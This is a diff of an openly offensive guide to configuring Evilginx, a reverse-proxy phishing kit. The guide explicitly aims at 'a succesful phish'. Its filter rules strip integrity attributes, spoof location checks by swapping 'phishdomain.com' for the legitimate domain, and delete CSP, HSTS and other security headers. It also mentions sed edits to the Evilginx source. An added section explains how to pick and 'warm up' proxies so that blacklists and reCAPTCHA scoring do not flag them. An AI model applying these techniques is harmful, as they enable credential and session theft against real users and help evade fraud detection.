@@ -41,9 +41,9 @@
 
   - {triggers_on: '', orig_sub: '', domain: '', search: 'integrity=(["']).*(["']), replace: 'integrity=${1}${2}', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript', 'text/html', 'application/json', 'image/svg+xml', 'text/plain']}
 
-  - {triggers_on: '', orig_sub: '', domain: '', search: '([A-Za-z0-9._]+)*location(\\\\.href|\\\\.hostname|\\\\.origin|\\\\.host|\\\\.domain|\\\\.toString|\\\\.site)([ ]*[;)],}|\n])', replace: '${1}location${2}.replace("phishdomain.com", "legit.domain.com")${3}', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript', 'text/html', 'application/json', 'image/svg+xml', 'text/plain']}
+  - {triggers_on: '', orig_sub: '', domain: '', search: '([A-Za-z0-9._]+)*location(\\.href|\\.hostname|\\.origin|\\.host|\\.domain|\\.toString|\\.site)([ ]*[;)],}|\n])', replace: '${1}location${2}.replace("phishdomain.com", "legit.domain.com")${3}', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript', 'text/html', 'application/json', 'image/svg+xml', 'text/plain']}
 
-  - {triggers_on: '', orig_sub: '', domain: '', search: '\\(window\\.location(\\\\.href|\\\\.hostname|\\\\.origin|\\\\.host|\\\\.domain|\\\\.toString|\\\\.site)([\s]+)*===([\s]+)*'phishdomain\\.com'\\)', replace: '(window.location${1}${2}===${3}'legit.domain.com')', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript', 'text/html', 'application/json', 'image/svg+xml', 'text/plain']}
+  - {triggers_on: '', orig_sub: '', domain: '', search: '\\(window\\.location(\\.href|\\.hostname|\\.origin|\\.host|\\.domain|\\.toString|\\.site)([\s]+)*===([\s]+)*'phishdomain\\.com'\\)', replace: '(window.location${1}${2}===${3}'legit.domain.com')', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript', 'text/html', 'application/json', 'image/svg+xml', 'text/plain']}
 ```
 
 ➺ if you already have `auto_filter: true`, it's not necessary to rewrite hostnames with subfilters, unless they look like `<legitsite>.com` or `legitsite\.com` (with hardcoded literal backslash)
@@ -67,7 +67,7 @@ issueorigin
   - {triggers_on: '', orig_sub: '', domain: '', search: '<meta.*(X-Permitted-Cross-Domain-Policies|X-Evilginx|Cross-Origin-Opener-Policy|Cross-Origin-Embedder-Policy|Cross-Origin-Resource-Policy|X-Apple-Auth-Attributes|X-Content-Security-Policy|X-Cache-Status|X-Cache|X-Permitted-Cross-Domain-Policies|X-Client-Data|Via|Forwarded|Public-Key-Pins|X-Forwarded-Host|Content-Security-Policy|Content-Security-Policy-Report-Only|Strict-Transport-Security|X-XSS-Protection|X-Content-Type-Options|X-Frame-Options|X-Forwarded-For|X-Real-IP|X-Client-IP|Connecting-IP|True-Client-IP|Client-IP).*>', replace: '', mimes: ['text/javascript', 'application/javascript', 'application/x-javascript', 'text/html', 'application/json', 'image/svg+xml', 'text/plain', 'font/woff2', 'charset=utf-8']}
 ```
 
-**There is gonna be security in the JS/XML responses, you must downgrade them in order to have a succesful phish, e.g.:**
+**There is gonna be security in the JS/XML responses, you must downgrade it in order to have a succesful phish, e.g.:**
 
 ```
 CorsEnabled: !0
@@ -94,7 +94,7 @@ Or any shit that conventional people with zero self-questioning would fall for, 
 
 ---
 
-**This is a list of sed -i commands that aim to modify Evilginx source:**
+**This is a list of sed -i commands that aim to modify Evilginx source (use it in the following order):**
 
 **[Remove deprecated io/ioutil]([url](https://github.com/kgretzky/evilginx2/pull/1050))**
 
@@ -176,6 +176,39 @@ You can also modify source (not included here) in order to allow [Header Overwri
 
 You can also modify source (not included here) in order to allow [Force Get]([url](https://github.com/kgretzky/evilginx2/pull/1163))
 
+---
+
+**When configuring a proxy for evilginx:**
+
+To [configure a proxy for evilginx]([url](https://help.evilginx.com/community/guides/proxy)) type: `help proxy`
+
+**[Low fraud score is not bullshit]([url](https://www.blackhatworld.com/seo/low-fraud-score-proxies.1490657/post-16304635)).**
+
+But when most people say “low fraud score” they mean to say “Google reCAPTCHA score”.
+
+Do you want to test a proxy to see if it is as clean as possible?
+
+First of all check the proxy here for any blacklists:
+
+[WhatIsMyIPAddress.com]([url](https://whatismyipaddress.com/blacklist-check))
+
+Second, connect to your proxy and go to this site [recaptcha-demo.appspot.com]([url](https://recaptcha-demo.appspot.com/)) → Request Scores
+
+This is reCaptcha v3 and it will detect if a user is bot like or not then it will rate it out of 1.0.
+
+I have discovered that this is the way Google ranks their users.
+
+If you connect directly and your score is 0.1. The proxy is bad get rid of it.
+
+If you get a score of 0.3 then its good. The reason why it's 0.3 is because Google will check if your PC has any information (if you have cookies etc) if its a clean new browser the score starts at 0.3
+
+But as soon as you navigate through a couple of sites you will get 0.7+.
+
+If it is 0.1 its because the IP has been blacklisted as Botted Recently.
+
+**If you have static IP proxies and you want to improve their score, hire someone to make a bot that surfs the web with them, over time, their score will increase.**
+
+Cheers!
 
 ---
 
